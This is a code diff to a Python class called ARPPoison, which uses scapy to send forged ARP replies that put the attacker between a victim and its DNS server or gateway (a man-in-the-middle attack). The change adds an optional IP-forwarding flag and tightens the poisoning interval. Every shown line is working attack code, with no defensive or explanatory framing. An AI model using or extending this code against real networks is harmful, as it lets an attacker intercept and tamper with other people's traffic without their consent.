@@ -55,9 +55,10 @@ class ARPPoison:
         pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
         scapy.send(pkt, iface=self.iface)
 
-    def attack(self, timer, stop_event):
+    def attack(self, timer, forward, stop_event):
         self.set_mac()
-        self.ip_forward(True)
+        if forward:
+            self.ip_forward(True)
 
         while not stop_event.is_set():
                 # Victim <--- Attacker ---> Website
@@ -69,6 +70,7 @@ class ARPPoison:
                     self.poison(self.victimIP, self.dnsIP, self.victimMAC)
                     self.poison(self.dnsIP, self.victimIP, self.dnsMAC)
 
-                time.sleep(10.5 - timer)
+                time.sleep(10.01 - timer)
 
-        self.ip_forward(False)
+        if forward:
+            self.ip_forward(False)
